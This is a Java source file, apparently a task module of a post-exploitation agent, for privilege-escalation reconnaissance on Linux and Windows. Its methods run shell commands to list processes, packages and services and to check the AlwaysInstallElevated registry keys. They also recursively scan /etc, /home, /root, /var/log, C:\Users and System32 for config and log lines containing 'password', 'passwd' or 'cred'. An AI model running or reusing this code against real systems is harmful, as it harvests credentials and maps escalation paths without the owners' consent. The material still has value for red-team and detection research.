package agent;

import java.util.Hashtable;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileReader;
import java.util.stream.Stream;
import java.util.stream.Collectors;
import java.util.Enumeration;
import java.util.Collections;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.Path;
import java.nio.file.DirectoryStream;



public class privs {
    static Hashtable scanResults = new Hashtable();
	public static ArrayList textSearch(String path, String[] keywords) throws IOException {
        ArrayList<String> result = new ArrayList<>();
        BufferedReader br = null;

        try {
            br = new BufferedReader(new FileReader(path));
	        String line;
	        while ((line = br.readLine()) != null) {
                for (int i=0; i<keywords.length;i++) {
                    if (line.indexOf(keywords[i]) != -1) {
                        result.add(line);
                    }
                }
	        }
        } catch (IOException e) {
	        return result;
        } finally {
	        if (br != null) {
	            br.close();
	        }
        }
        return result;
    }

    public static void scanner(String[] pathSet, String[] extensions, String[] keywords) throws IOException {

        //File root = new File( path );
        //File[] list = root.listFiles();
        for (int i=0; i<pathSet.length; i++) {
            Path root = Paths.get(pathSet[i]);
            try (DirectoryStream<Path> list = Files.newDirectoryStream(root)) {
            //if (list == null) {return walked;}

                for ( Path f : list ) {
                    String stringPath = f.toString();
                    if (Files.isDirectory(f)) {
                        scanner(new String[] {stringPath},extensions,keywords);
                    }
                    for (int j=0; j<extensions.length; j++) {
                        if (stringPath.contains(extensions[j])) {
                            ArrayList searched = textSearch(f.toString(),keywords);

                            if (searched.size() != 0) {
                                privs.scanResults.put(stringPath,Arrays.toString(searched.toArray()));
                            }
		                }
		            }
                }
            } catch (IOException e) {}
        }
    }

	public static String executor(String interpreter, String flags, String command) throws IOException, InterruptedException {
		Process executor = Runtime.getRuntime().exec(new String[] {interpreter,flags,command});
		StringBuilder output = new StringBuilder();
		BufferedReader reader = new BufferedReader(
			new InputStreamReader(executor.getInputStream()));
		String line;
		while ((line = reader.readLine()) != null) {
			output.append(line + "\n");
		}
		int exitCode = executor.waitFor();
		return output.toString();
	}

	public static Hashtable linuxProcs(Hashtable args) throws IOException, InterruptedException {
		Hashtable taskOut = new Hashtable();

		String output = executor("/bin/sh","-c","ps -ef");
		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable linuxPackages(Hashtable args) throws IOException, InterruptedException {
		//needs to change to avoid command execution
		Hashtable taskOut = new Hashtable();
		String pkgManager = new String();
		String output = new String();

		Hashtable opts = new Hashtable();
		opts.put("yum","list installed");
		opts.put("dpkg","-l");
		opts.put("pacman","-Q");
		

		String[] envPath = System.getenv("PATH").split(":");
		for (int i=0;i<envPath.length;i++) {
			File searchDirectory = new File(envPath[i]);
			String[] dirContent = searchDirectory.list();
			for (int c=0;c<dirContent.length;c++) {
				if (dirContent[c].equals("yum")) {
					pkgManager = "yum";
				}
				if (dirContent[c].equals("dpkg")) {
					pkgManager = "dpkg";
				}
				if (dirContent[c].equals("pacman")) {
					pkgManager = "pacman";
				}
			}
		}
		if (pkgManager.length() == 0) {
			output = "could not find known package manager";
		} else {
			String executableQuery = pkgManager + " " + opts.get(pkgManager).toString();
			output = executor("/bin/sh","-c",executableQuery);
		}
		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable linuxTextpass(Hashtable args) {
		Hashtable taskOut = new Hashtable();

        String[] searchPaths = new String[] {"/var/log","/etc","/home","/root"};
        String[] searchFilters = new String[] {"passwd","password","cred"};
        String[] extensionFilters = new String[] {".config",".conf",".xml",".json",".log"};

        scanner(searchPaths,extensionFilters,searchFilters);
        taskOut.put("output",privs.scanResults.toString());
		return taskOut;
	}

	public static Hashtable windowsMsi(Hashtable args) throws IOException, InterruptedException {
		Hashtable taskOut = new Hashtable();
		Hashtable msiStatus = new Hashtable();
		msiStatus.put("HKLM",executor("cmd.exe","/c","reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"));
		msiStatus.put("HKCU",executor("cmd.exe","/c","reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"));
		String output = msiStatus.toString();

		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable windowsServices(Hashtable args) throws IOException, InterruptedException {
		Hashtable taskOut = new Hashtable();

		String output = executor("cmd.exe","/c","sc query");

		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable windowsTextpass(Hashtable args) {
		Hashtable taskOut = new Hashtable();
		String[] searchPaths = new String[] {"C:\\Windows\\System32","C:\\Users"};
		String[] searchFilters = new String[] {"passwd","password","cred"};
		String[] extensionFilters = new String[] {".config",".conf",".xml",".json",".log"};
						
		scanner(searchPaths,extensionFilters,searchFilters);
		taskOut.put("output",privs.scanResults.toString());
		return taskOut;
	}
}
